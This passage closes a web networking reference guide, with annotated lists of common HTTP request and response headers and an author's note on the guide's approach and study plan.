Host: example.com                              # Required in HTTP/1.1
Authorization: Bearer <token>                  # Authentication
Content-Type: application/json                 # Request body format
Accept: application/json                       # Desired response format
Accept-Encoding: gzip, deflate, br             # Supported compression
Accept-Language: en-US,en;q=0.9                # Preferred language
User-Agent: Mozilla/5.0 ...                    # Client identification
Cookie: session=abc123                         # Cookies
Cache-Control: no-cache                        # Caching directive
If-None-Match: "etag-value"                    # Conditional (ETag)
If-Modified-Since: <date>                      # Conditional (date)
Origin: https://app.com                        # CORS origin
Referer: https://app.com/page                  # Referring page
X-Forwarded-For: 203.0.113.195                # Client IP (behind proxy)
X-Request-ID: <uuid>                           # Request tracing
```

### Response Headers
```
Content-Type: application/json; charset=utf-8  # Response body format
Content-Length: 1234                            # Response body size
Content-Encoding: gzip                         # Compression used
Cache-Control: public, max-age=3600            # Caching rules
ETag: "abc123"                                 # Content fingerprint
Last-Modified: <date>                          # Last change date
Set-Cookie: name=value; HttpOnly; Secure       # Set cookie
Location: /new-url                             # Redirect target
Access-Control-Allow-Origin: https://app.com   # CORS
Strict-Transport-Security: max-age=31536000    # HSTS
Content-Security-Policy: default-src 'self'    # CSP
X-RateLimit-Remaining: 99                      # Rate limit info
Retry-After: 60                                # When to retry (429/503)
```

---

> **Last updated**: March 2026
>
> **Author philosophy**: Every concept in this document is something I've debugged in production, explained in a design review, or tested in an interview at a FAANG company. If you understand every section here, you can debug any web networking issue and design any distributed system's networking layer.
>
> **Next steps**: Pick one chapter per week. Build something that uses the concepts. Break it. Debug it. That's how you internalize this knowledge.
